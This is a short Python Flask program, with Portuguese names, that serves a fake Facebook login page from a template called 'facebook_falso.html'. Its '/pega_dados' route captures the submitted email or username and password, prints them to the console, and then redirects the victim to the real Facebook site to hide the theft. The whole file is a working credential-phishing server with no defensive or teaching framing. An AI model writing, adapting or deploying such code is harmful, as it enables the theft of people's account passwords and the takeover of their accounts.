from flask import Flask, render_template, request, redirect

app=Flask(__name__)

@app.route("/")
def pagina_inicial():
    return render_template("facebook_falso.html")

@app.route("/pega_dados", methods=["POST"])
def pega_dados():
    email_ou_usuario = request.form.get("email")
    senha = request.form.get("pass")
    print("_____________________________________________________________________________________________")
    print(f"|Email ou usuario: {email_ou_usuario} \n|Senha: {senha}")
    print("|____________________________________________________________________________________________")
    return redirect ("https://www.facebook.com/?locale2=pt_BR&_rdr")
app.run()

